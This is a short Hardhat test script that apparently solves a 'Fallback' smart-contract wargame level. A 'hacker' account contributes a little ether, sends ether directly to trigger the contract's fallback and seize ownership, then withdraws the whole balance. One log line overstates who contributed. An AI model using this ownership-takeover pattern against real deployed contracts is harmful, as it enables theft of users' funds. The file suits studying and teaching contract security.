const { expect } = require("chai");
const { ethers } = require("hardhat");
let provider = ethers.getDefaultProvider();

describe("FallBack", function () {
  it("Hack Contract", async function () {
    const FallBack = await ethers.getContractFactory("Fallback");
    const fallback = await FallBack.deploy();
    await fallback.deployed();
    const [owner,hacker] = await hre.ethers.getSigners();

    await fallback.connect(hacker).contribute({value: ethers.utils.parseEther("0.0001")});
    console.log("owner and hacker contribute 0.0001 eth in the contract");
    console.log("The Owner address of contract %s", await fallback.owner());
    await hacker.sendTransaction({
      to: fallback.address,
      value: ethers.utils.parseEther("1")
    });
    console.log("The hacker send ether to contract and become the new owner of contract");
    console.log("The new Owner address of contract %s", await fallback.owner());
    console.log("Le hacker withdraw en tant que owner et prends tout les eth du contract Fallback.sol");
    await fallback.connect(hacker).withdraw();

  });
});
